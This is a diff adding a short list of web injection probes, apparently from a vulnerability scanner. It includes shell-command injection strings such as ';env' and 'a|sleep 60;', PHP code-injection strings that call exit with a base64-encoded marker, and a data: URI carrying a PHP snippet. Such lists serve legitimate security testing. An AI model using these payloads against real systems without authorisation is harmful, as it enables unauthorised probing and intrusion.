@@ -1,0 +1,24 @@
+;env
+a;env
+a);env
+[VALUE];env
+[VALUE][LF]env
+/e\0
+a;exit(base64_decode('aGFjazNyCg=='));//
+a;exit(base64_decode('aGFjazNyCg=='));#
+";exit(base64_decode('aGFjazNyCg=='));//
+";exit(base64_decode('aGFjazNyCg=='));#
+';exit(base64_decode('aGFjazNyCg=='));//
+';exit(base64_decode('aGFjazNyCg=='));#
+".exit(base64_decode('aGFjazNyCg=='));//
+".exit(base64_decode('aGFjazNyCg=='));#
+'.exit(base64_decode('aGFjazNyCg=='));//
+'.exit(base64_decode('aGFjazNyCg=='));#
+exit(base64_decode('aGFjazNyCg=='));//
+exit(base64_decode('aGFjazNyCg=='));#
+data:;base64,PD9waHAgZXhpdCgndzRwMXQxX2V2YWwnKTs/Pg==
+//<?php exit('w4p1t1_eval');?>
+a`)`
+a`sleep 60`
+a;sleep 60;
+a|sleep 60;
